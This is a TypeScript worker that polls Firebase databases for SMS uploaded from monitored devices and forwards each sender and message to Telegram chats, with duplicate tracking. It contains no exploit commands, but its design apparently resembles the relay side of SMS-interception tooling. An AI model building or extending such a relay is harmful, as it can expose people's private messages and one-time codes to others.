import { bot } from "../bot/bot";

import { MonitoringRepository } from "../database/repositories/MonitoringRepository";
import { BackendRepository } from "../database/repositories/BackendRepository";
import { MessageLogRepository } from "../database/repositories/MessageLogRepository";
import { ProcessedSmsRepository } from "../database/repositories/ProcessedSmsRepository";

import { FirebaseRestClient } from "../backends/firebase/FirebaseRestClient";

import { logger } from "../logger/logger";


let isRunning = false;



export function startFirebaseSmsWorker() {


    setInterval(async () => {


        if (isRunning) {

            return;

        }


        isRunning = true;



        try {


            const sessions:any[] =
                MonitoringRepository.findRunning();



            console.log(
                "RUNNING SESSIONS:",
                sessions.length
            );



            if (!sessions.length) {

                return;

            }




            for (const session of sessions) {



                const backend:any =
                    BackendRepository.findConfig(
                        session.backend_id
                    );



                if (!backend) {

                    continue;

                }



                if (
                    backend.backend_type !== "firebase_json" &&
                    backend.backend_type !== "firebase_url"
                ) {

                    continue;

                }



                const databaseUrl =
                    backend.config.database_url ||
                    backend.config;



                if (!databaseUrl) {

                    continue;

                }





                const firebaseData:any =
                    await FirebaseRestClient.getIncomingSms(

                        databaseUrl,

                        session.device_id

                    );




                if (
                    !firebaseData ||
                    typeof firebaseData !== "object"
                ) {

                    continue;

                }





                const smsMessages:any = {};



                for (
                    const senderBlock of Object.values<any>(firebaseData)
                ) {


                    if (
                        senderBlock &&
                        senderBlock.messages
                    ) {


                        Object.assign(

                            smsMessages,

                            senderBlock.messages

                        );


                    }


                }





                console.log(
                    "SMS FOUND:",
                    Object.keys(smsMessages).length
                );




                let samplePrinted = false;




                for (
                    const [key, sms] of Object.entries<any>(smsMessages)
                ) {

                    console.log("======================");
                    console.log("CHECKING SMS KEY:", key);
                    console.log("IS OLD:", sms.is_old_message);
                    console.log("MESSAGE:", sms.message);
                    console.log("======================");



                    if (!samplePrinted) {


                        console.log("======================");
                        console.log("SMS KEY:", key);
                        console.log("SMS SAMPLE:", sms);
                        console.log("======================");


                        samplePrinted = true;

                    }





                    // =====================================
                    // IGNORE OLD FIREBASE SMS
                    // =====================================


                    if (

                        sms.is_old_message === true ||

                        key.startsWith("old_incoming")

                    ) {



                        ProcessedSmsRepository.create({

                            backendId:
                                session.backend_id,

                            deviceId:
                                session.device_id,

                            source:
                                "incoming",

                            uniqueKey:
                                key

                        });



                        console.log(
                            "OLD SMS SKIPPED:",
                            key
                        );


                        continue;

                    }





                    // =====================================
                    // CHECK DUPLICATE
                    // =====================================


                    const exists =
                        ProcessedSmsRepository.exists({

                            backendId:
                                session.backend_id,

                            deviceId:
                                session.device_id,

                            source:
                                "incoming",

                            uniqueKey:
                                key

                        });



                    if (exists) {


                        continue;


                    }







                    const message =
                        sms.message ||
                        sms.body ||
                        sms.text ||
                        "Unknown SMS";




                    const sender =
                        sms.sender ||
                        sms.number ||
                        "Unknown";





                    const receivedAt =
                        sms.timestamp_ms

                            ?

                            new Date(

                                Number(
                                    sms.timestamp_ms
                                )

                            ).toISOString()

                            :

                            new Date().toISOString();








                    try {



                        await bot.telegram.sendMessage(

                            session.chat_id,


`📩 Incoming SMS

📱 Device:
${session.device_id}

📞 Sender:
${sender}

💬 Message:
${message}

🕒 Time:
${new Date().toLocaleString()}`

                        );







                        // Save processed only after Telegram success

                        ProcessedSmsRepository.create({

                            backendId:
                                session.backend_id,

                            deviceId:
                                session.device_id,

                            source:
                                "incoming",

                            uniqueKey:
                                key

                        });







                        MessageLogRepository.insert({

                            telegramId:
                                session.telegram_id,

                            backendId:
                                session.backend_id,

                            deviceId:
                                session.device_id,

                            deviceModel:
                                sms.device_model,

                            phoneNumber:
                                sender,

                            message,

                            receivedAt

                        });







                        logger.info(

                            `SMS forwarded -> ${session.chat_id}`

                        );







                        // Telegram rate protection

                        await new Promise(

                            resolve =>

                                setTimeout(
                                    resolve,
                                    1200
                                )

                        );





                    } catch(error:any) {


                        logger.error(

                            `Telegram send failed: ${error.message}`

                        );


                    }



                }



            }





        } catch(error:any) {


            logger.error(

                `FirebaseSmsWorker: ${error.message}`

            );



        } finally {


            isRunning = false;


        }



    },15000);


}